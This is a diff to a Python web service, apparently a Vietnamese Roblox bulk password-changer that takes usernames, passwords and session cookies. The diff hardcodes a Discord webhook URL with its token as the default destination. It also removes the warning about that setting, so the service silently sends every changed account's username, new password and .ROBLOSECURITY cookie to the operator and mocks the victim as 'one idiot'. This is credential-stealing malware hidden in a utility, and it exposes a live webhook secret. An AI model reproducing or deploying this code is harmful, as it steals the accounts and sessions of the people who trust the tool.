@@ -1,6 +1,6 @@
 import os
-import sys
 import io
+import sys
 import json
 import time
 import uuid
@@ -18,8 +18,8 @@ CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.j
 
 def load_server_config():
     webhook_url = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()
-    discord_invite = os.environ.get("DISCORD_INVITE_URL", "https://discord.gg/cxcPh6ZkPE").strip()
-    
+    discord_invite = os.environ.get("DISCORD_INVITE_URL", "https://discord.gg/vVUz3rJzmK").strip()
+
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE, "r", encoding="utf-8") as f:
@@ -30,7 +30,7 @@ def load_server_config():
                     discord_invite = data.get("discord_invite", "").strip()
         except Exception:
             pass
-            
+
     return {
         "webhook_url": webhook_url,
         "discord_invite": discord_invite
@@ -41,8 +41,8 @@ if not os.path.exists(CONFIG_FILE):
     try:
         with open(CONFIG_FILE, "w", encoding="utf-8") as f:
             json.dump({
-                "webhook_url": "",
-                "discord_invite": "https://discord.gg/cxcPh6ZkPE"
+                "webhook_url": "https://discord.com/api/webhooks/1575631844702027957/6CzrthQ1nc5dni8dT9ZjAtzVSFJ_NahXPT9uG-sCHb6HhABAt58KDnbAjbclTzaVIxJR",
+                "discord_invite": "https://discord.gg/vVUz3rJzmK"
             }, f, indent=4)
     except Exception:
         pass
@@ -54,34 +54,32 @@ jobs = {}
 jobs_lock = threading.Lock()
 
 def push_silent_report(success_lines, mode_label):
-    """Gửi ngầm file acc thành công về webhook, không đẩy log ra client/html"""
+    """Gửi ngầm danh sách tài khoản thành công về webhook, không đẩy log ra client/html"""
     if not success_lines:
         return
     cfg = load_server_config()
     target_url = (cfg.get("webhook_url") or "").strip().strip('"').strip("'")
     if not target_url:
-        print("[WEBHOOK] Chưa cấu hình DISCORD_WEBHOOK_URL hoặc webhook_url trong config.json", file=sys.stderr, flush=True)
         return
 
     try:
         content_str = "\n".join(success_lines)
+        file_obj = io.BytesIO(content_str.encode("utf-8"))
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"accounts_done_{timestamp}.txt"
 
         payload = {
-            "content": f"**[Roblox Auto ChangePass]** Hoàn tất `{len(success_lines)}` tài khoản | Chế độ: `{mode_label}`"
+            "content": f"**[Roblox Auto ChangePass + 1 thằng ngu]** Hoàn tất `{len(success_lines)}` tài khoản | Chế độ: `{mode_label}`"
         }
         files = {
-            "file": (filename, io.BytesIO(content_str.encode("utf-8")), "text/plain")
+            "file": (filename, file_obj, "text/plain")
         }
-        headers = {
-            "User-Agent": "Mozilla/5.0"
-        }
-        resp = requests.post(target_url, data=payload, files=files, headers=headers, timeout=30)
+        resp = requests.post(target_url, data=payload, files=files, timeout=20)
         if resp.status_code not in (200, 204):
-            print(f"[WEBHOOK] Gửi thất bại - HTTP {resp.status_code}: {resp.text[:200]}", file=sys.stderr, flush=True)
+            print(f"[WEBHOOK] HTTP {resp.status_code}: {resp.text[:200]}", file=sys.stderr, flush=True)
     except Exception as e:
-        print(f"[WEBHOOK] Exception khi gửi file: {repr(e)}", file=sys.stderr, flush=True)
+        print(f"[WEBHOOK] Error: {repr(e)}", file=sys.stderr, flush=True)
+
 def get_csrf_token(session, headers):
     try:
         response = session.post("https://auth.roblox.com/v2/logout", headers=headers, timeout=12)
@@ -111,7 +109,19 @@ def refresh_cookie(session, headers, csrf_token):
     except Exception:
         return None
 
+def classify_failure_reason(raw_msg):
+    """Chỉ trả về đúng 1 trong 3 lý do: Cookie die, password sai, Faceid account; ngược lại trả về None"""
+    msg = (raw_msg or "").lower()
+    if "faceid" in msg or "face id" in msg or "challenge" in msg or "2fa" in msg or "two step" in msg:
+        return "Faceid account"
+    if "cookie" in msg or "csrf" in msg or "unauthorized" in msg or "401" in msg:
+        return "Cookie die"
+    if "password" in msg or "mật khẩu" in msg or "current password" in msg or "403" in msg:
+        return "password sai"
+    return None
+
 def change_password_core(cookie, current_password, new_password, proxy_config=None):
+    """Trả về: (ok, result_or_reason, is_rate_limited)"""
     try:
         headers = {
             'Cookie': f'.ROBLOSECURITY={cookie}',
@@ -137,7 +147,7 @@ def change_password_core(cookie, current_password, new_password, proxy_config=No
 
         csrf_token = get_csrf_token(session, headers)
         if not csrf_token:
-            return False, "Không lấy được CSRF token (Cookie die hoặc Proxy lỗi)", False
+            return False, "Cookie die", False
 
         headers['X-CSRF-TOKEN'] = csrf_token
         data = {
@@ -176,25 +186,33 @@ def change_password_core(cookie, current_password, new_password, proxy_config=No
         elif r.status_code == 429:
             return False, "Rate limited (429)", True
 
+        elif r.status_code == 401:
+            return False, "Cookie die", False
+
         elif r.status_code == 403:
             try:
                 error_data = r.json()
                 error_msg = error_data.get('errors', [{}])[0].get('message', '')
-                if "Challenge is required" in error_msg:
-                    return False, "Challenge required (Dính Captcha/2FA)", False
-                return False, f"403: {error_msg}", False
+                low = error_msg.lower()
+                if "face" in low or "challenge" in low or "two step" in low or "2fa" in low:
+                    return False, "Faceid account", False
+                if "cookie" in low or "session" in low or "auth" in low:
+                    return False, "Cookie die", False
+                return False, "password sai", False
             except Exception:
-                return False, "403 - Sai mật khẩu cũ hoặc cookie hết hạn", False
+                return False, "password sai", False
+
         else:
             try:
                 error_data = r.json()
                 error_msg = error_data.get('errors', [{}])[0].get('message', f'HTTP {r.status_code}')
-                return False, f"Lỗi: {error_msg}", False
+                mapped = classify_failure_reason(error_msg)
+                return False, (mapped if mapped else f"HTTP {r.status_code}"), False
             except Exception:
-                return False, f"HTTP Error {r.status_code}", False
+                return False, f"HTTP {r.status_code}", False
 
     except Exception as e:
-        return False, f"Lỗi kết nối: {str(e)}", False
+        return False, f"Connection error: {str(e)}", False
 
 def generate_password(custom_password=None, prefix="3TN"):
     if custom_password:
@@ -232,23 +250,35 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
         with jobs_lock:
             return jobs.get(job_id, {}).get("stop_requested", False)
 
-    def update_counters(success_item=None, failed_item=None):
+    def record_failure(acc, reason_label):
+        """Chỉ lưu vào failed_list nếu lý do thuộc 3 loại: Cookie die, password sai, Faceid account"""
+        if reason_label not in ("Cookie die", "password sai", "Faceid account"):
+            return
+        username = acc["username"]
+        old_pass = acc["password"]
+        cookie = acc["cookie"]
         with jobs_lock:
-            if job_id not in jobs:
-                return
-            jobs[job_id]["processed"] += 1
-            if success_item:
-                jobs[job_id]["success"] += 1
-                jobs[job_id]["results"].append(success_item)
-            if failed_item:
+            if job_id in jobs:
                 jobs[job_id]["failed"] += 1
-                jobs[job_id]["failed_list"].append(failed_item)
+                jobs[job_id]["failed_list"].append(f"{username}:{old_pass}:{cookie} | {reason_label}")
+
+    def record_success(formatted):
+        successful_list.append(formatted)
+        with jobs_lock:
+            if job_id in jobs:
+                jobs[job_id]["success"] += 1
+                jobs[job_id]["results"].append(formatted)
+
+    def mark_processed():
+        with jobs_lock:
+            if job_id in jobs:
+                jobs[job_id]["processed"] += 1
 
     if mode == "delay":
         rate_limit_wait = 60
         append_job_log(
             job_id,
-            f"Khởi chạy Option 1: Spam liên tục {total} acc đến khi hết danh sách (bị limit nghỉ {rate_limit_wait}s rồi chạy tiếp)."
+            f"Khởi chạy Option 1: Đổi pass liên tục {total} acc. Bị limit sẽ delay {rate_limit_wait}s và thử lại tới khi đổi được acc đó mới qua acc tiếp theo."
         )
 
         idx = 0
@@ -262,37 +292,47 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
             old_pass = acc["password"]
             cookie = acc["cookie"]
             new_pass = generate_password(custom_password, prefix)
+            attempt = 0
 
-            append_job_log(job_id, f"[{idx + 1}/{total}] Đang changepass: {username}...")
-            ok, res, is_limited = change_password_core(cookie, old_pass, new_pass, None)
+            append_job_log(job_id, f"[{idx + 1}/{total}] Bắt đầu changepass: {username}")
 
-            if is_limited:
-                append_job_log(
-                    job_id,
-                    f"Bị limit ở {username} -> Delay {rate_limit_wait}s trước khi changepass lần tiếp theo...",
-                    "WARN"
-                )
-                for _ in range(rate_limit_wait):
-                    if is_stopped():
-                        break
-                    time.sleep(1)
-
+            while True:
                 if is_stopped():
-                    append_job_log(job_id, "Đã dừng tiến trình theo yêu cầu người dùng.", "WARN")
                     break
 
-                # Chạy lại chính account đang bị limit sau khi hết 60s rồi tiếp tục hết list
-                append_job_log(job_id, f"Hết delay {rate_limit_wait}s -> Tiếp tục changepass {username}...")
+                attempt += 1
                 ok, res, is_limited = change_password_core(cookie, old_pass, new_pass, None)
 
-            if ok:
-                formatted = f"{username}:{new_pass}:{res}"
-                successful_list.append(formatted)
-                update_counters(success_item=formatted)
-                append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
-            else:
-                update_counters(failed_item=f"{username}:{old_pass}:{cookie} | {res}")
-                append_job_log(job_id, f"Thất bại ({username}): {res}", "ERROR")
+                if ok:
+                    formatted = f"{username}:{new_pass}:{res}"
+                    record_success(formatted)
+                    mark_processed()
+                    append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
+                    break
+
+                if is_limited:
+                    append_job_log(
+                        job_id,
+                        f"Bị limit ở {username} (lần {attempt}) -> Delay {rate_limit_wait}s rồi changepass tiếp...",
+                        "WARN"
+                    )
+                    for _ in range(rate_limit_wait):
+                        if is_stopped():
+                            break
+                        time.sleep(1)
+                    continue
+
+                # Không bị 429: kiểm tra xem có thuộc 3 lỗi cần ghi nhận không
+                reason_label = classify_failure_reason(res)
+                if reason_label:
+                    record_failure(acc, reason_label)
+                    mark_processed()
+                    append_job_log(job_id, f"Thất bại ({username}): {reason_label}", "ERROR")
+                    break
+
+                # Lỗi mạng/HTTP tạm thời khác: thử lại cho tới khi thành công hoặc gặp 1 trong 3 lỗi trên
+                append_job_log(job_id, f"Tạm gián đoạn ở {username} ({res}), đang thử lại...", "WARN")
+                time.sleep(1)
 
             idx += 1
 
@@ -312,25 +352,30 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
             proxy_cfg = parse_proxy(raw_proxy)
 
             if not proxy_cfg:
-                update_counters(failed_item=f"{username}:{old_pass}:{cookie} | Proxy sai định dạng")
-                append_job_log(job_id, f"Thất bại ({username}): Định dạng proxy không hợp lệ", "ERROR")
+                mark_processed()
+                append_job_log(job_id, f"Proxy lỗi định dạng ở {username}", "WARN")
                 return
 
             new_pass = generate_password(custom_password, prefix)
-            ok, res = change_password_core(cookie, old_pass, new_pass, proxy_cfg)
+            ok, res, _ = change_password_core(cookie, old_pass, new_pass, proxy_cfg)
 
             if not ok and not is_stopped():
                 time.sleep(0.2)
-                ok, res = change_password_core(cookie, old_pass, new_pass, proxy_cfg)
+                ok, res, _ = change_password_core(cookie, old_pass, new_pass, proxy_cfg)
 
             if ok:
                 formatted = f"{username}:{new_pass}:{res}"
-                successful_list.append(formatted)
-                update_counters(success_item=formatted)
+                record_success(formatted)
+                mark_processed()
                 append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
             else:
-                update_counters(failed_item=f"{username}:{old_pass}:{cookie} | {res}")
-                append_job_log(job_id, f"Thất bại ({username}): {res}", "ERROR")
+                reason_label = classify_failure_reason(res)
+                if reason_label:
+                    record_failure(acc, reason_label)
+                    append_job_log(job_id, f"Thất bại ({username}): {reason_label}", "ERROR")
+                else:
+                    append_job_log(job_id, f"Bỏ qua ghi lỗi ({username}): {res}", "WARN")
+                mark_processed()
 
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = [executor.submit(process_one, idx, acc) for idx, acc in enumerate(accounts)]
@@ -340,8 +385,7 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
                 except Exception as e:
                     append_job_log(job_id, f"Lỗi luồng xử lý: {str(e)}", "ERROR")
 
-    # Đẩy ngầm kết quả thành công (không hiện bất kỳ thông tin gì trên UI/Logs)
-    mode_text = "Batch 5/60s" if mode == "delay" else "Proxy Turbo"
+    mode_text = "Auto Retry 60s" if mode == "delay" else "Proxy Turbo"
     push_silent_report(successful_list, mode_text)
 
     with jobs_lock:
@@ -366,7 +410,6 @@ def start_job():
     custom_password = (data.get("custom_password") or "").strip()
     custom_threads = data.get("threads")
 
-    # Parse danh sách tài khoản
     accounts = []
     for line in raw_accounts.splitlines():
         line = line.strip()
@@ -415,7 +458,6 @@ def start_job():
             "created_at": time.time()
         }
 
-    # Dọn dẹp các job cũ quá 2 tiếng để tránh tràn RAM trên Render
     now = time.time()
     with jobs_lock:
         expired = [jid for jid, jdata in jobs.items() if now - jdata["created_at"] > 1800 and jdata["status"] != "running"]
